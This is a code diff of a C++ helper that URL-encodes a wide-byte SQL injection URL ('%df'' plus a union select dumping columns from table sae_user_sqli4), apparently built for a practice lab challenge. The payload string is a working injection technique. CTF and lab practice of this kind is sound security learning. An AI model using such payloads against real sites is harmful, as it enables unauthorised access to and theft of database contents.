@@ -22,37 +22,32 @@ using namespace std;
 
 int main() {
     string temp;
-    string s = "http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=2%df' union select 4,database(),user()#";
+    vector<string> symbol_0 = {"%df", "'", " ", "(", ")", "#"};
+    vector<string> symbol_1 = {"%df", "%27", "%20", "%28", "%29", "%23"};
+    string s = "http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=2%df' union select 1,group_concat(title_1),group_concat(content_1) from sae_user_sqli4#";
+
+    bool flag = true;
     unsigned index = 0;
     while(index < s.size()) {
-        switch(s[index]) {
-            case '%': {
-                temp += s[index];
-                temp += s[index + 1];
-                temp += s[index + 2];
+        string sub_string_1 = s.substr(index, 1);
+        string sub_string_3 = s.substr(index, 3);
+        for(unsigned i = 0; i < symbol_0.size(); ++i) {
+            if(symbol_0[i] == sub_string_3) {
+                temp += symbol_1[i];
                 index += 3;
-            }; break;
-            case ' ': {
-                temp += "%20";
-                ++index;
-            }; break;
-            case '(': {
-                temp += "%28";
-                ++index;
-            }; break;
-            case ')': {
-                temp += "%29";
-                ++index;
-            }; break;
-            case '#': {
-                temp += "%23";
-                ++index;
-            }; break;
-            default: {
-                temp += s[index];
-                ++index;
-            }; break;
+                flag = false;
+            }
+            else if(symbol_0[i] == sub_string_1) {
+                temp += symbol_1[i] ;
+                index += 1;
+                flag = false;
+            }
         }
+        if(flag) {
+            temp += s[index];
+            ++index;
+        }
+        flag = true;
     }
     cout << temp << endl;
     return 0;
